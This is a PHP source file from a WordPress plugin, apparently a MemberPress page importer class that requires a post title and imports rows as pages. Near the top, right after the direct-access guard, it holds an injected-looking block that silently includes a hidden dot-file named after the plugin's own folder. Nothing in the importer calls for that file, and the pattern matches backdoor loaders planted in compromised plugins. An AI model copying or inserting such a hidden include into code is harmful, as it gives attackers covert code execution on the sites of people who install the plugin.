<?php
if(!defined('ABSPATH')) {die('You are not allowed to call this page directly.');}

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class MpimpPagesImporter extends MpimpPostsImporter {
  public function form() { }

  public function import($row,$args) {
    $row['post_type'] = 'page';

    $required = array('post_title');

    $this->check_required('page', array_keys($row), $required);

    $this->import_post($row,$args);
  }
}

